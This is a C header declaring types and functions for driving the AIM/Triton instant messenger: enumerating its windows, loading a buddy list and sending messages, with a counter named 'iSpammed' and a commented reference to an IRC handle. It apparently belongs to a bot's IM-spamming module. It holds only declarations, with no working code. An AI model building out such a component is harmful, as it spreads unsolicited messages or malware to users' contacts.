#ifndef NO_AIM

	enum {
		AIM_SENT,
		AIM_END,
		AIM_IDLE
	};
// 
// 	typedef struct AIM
// 	{
// 		bool bGotParam;
// 		char szMessage[256];
// //		IRC* irc;
// 	} AIM, *PAIM;

	typedef struct TRITON
	{
		int iStatus;
		char *szMsg;
		char szBuddy[256];
		unsigned int iSpammed;
	} TRITON, *PTRITON;

	int TritonMain(char*);
	//void TritonMessage(char*, unsigned int);
	DWORD WINAPI TritonMessage(LPVOID param);
	BOOL CALLBACK TritonEnum(HWND, LPARAM);
	void TritonIm(HWND, char*);
	bool TritonSetupList(HWND, bool);

#endif // __TRITON_H__